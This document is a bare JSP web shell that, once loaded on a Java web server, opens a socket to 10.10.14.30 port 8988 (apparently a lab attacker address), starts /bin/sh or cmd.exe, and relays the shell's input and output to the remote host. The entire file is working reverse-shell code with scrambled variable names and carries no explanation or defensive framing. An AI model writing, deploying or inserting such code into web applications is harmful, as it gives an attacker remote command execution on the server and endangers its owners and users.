<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream zd;
    OutputStream qz;

    StreamConnector( InputStream zd, OutputStream qz )
    {
      this.zd = zd;
      this.qz = qz;
    }

    public void run()
    {
      BufferedReader pv  = null;
      BufferedWriter aqt = null;
      try
      {
        pv  = new BufferedReader( new InputStreamReader( this.zd ) );
        aqt = new BufferedWriter( new OutputStreamWriter( this.qz ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = pv.read( buffer, 0, buffer.length ) ) > 0 )
        {
          aqt.write( buffer, 0, length );
          aqt.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( pv != null )
          pv.close();
        if( aqt != null )
          aqt.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.30", 8988 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
